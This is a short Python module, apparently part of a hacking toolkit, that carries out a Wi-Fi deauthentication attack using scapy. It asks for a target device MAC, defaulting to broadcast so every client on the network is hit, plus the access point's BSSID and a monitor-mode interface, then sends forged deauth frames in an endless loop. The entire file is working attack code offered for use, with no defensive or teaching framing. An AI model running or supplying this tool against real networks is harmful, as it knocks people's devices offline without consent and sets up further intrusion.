from colorama import Fore, Back, Style, init
from scapy.all import *
import time

def deauth_attack():
    init(autoreset=True)

    print(Fore.CYAN + "\n--- Wi-Fi Targeted Deauth Attack Module ---")
    
    target_mac = input(Fore.YELLOW + "Enter Target Device(Phone,PC etc.) MAC Address(if you want Deauth the All devices in the wifi press enter): ").strip()
    
    if not target_mac:
        target_mac = "FF:FF:FF:FF:FF:FF"
        print(Fore.LIGHTMAGENTA_EX + "[*] No MAC entered. Targeting ALL devices (Broadcast).")

    gateway_mac = input(Fore.YELLOW + "Enter Gateway MAC Address (BSSID): ").strip()
    interface = input(Fore.YELLOW + "Enter Monitor Mode Interface Name: ").strip()

    if not gateway_mac or not interface:
        print(Fore.RED + "[-] Error: Gateway MAC and Interface cannot be empty!")
        return False

    try:
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        print(Fore.BLUE + f"\n[+] Deauth Attack Started against {target_mac}")
        print(Fore.BLUE + "[!] Press CTRL+C to stop the attack...\n")

        while True:
            try:
                sendp(packet, iface=interface, count=5, verbose=False)
                print(Fore.GREEN + f"[*] Deauth packet sent to {target_mac} via {gateway_mac}")
                time.sleep(0.1)
            except KeyboardInterrupt:
                print(Fore.RED + "\n[-] Deauth Attack Stopped by User.")
                return False
            except Exception as e:
                print(Fore.RED + f"\n[-] Error during execution: {e}")
                return False
                
    except Exception as e:
        print(Fore.RED + f"[-] Initialization Error: {e}")
        return False

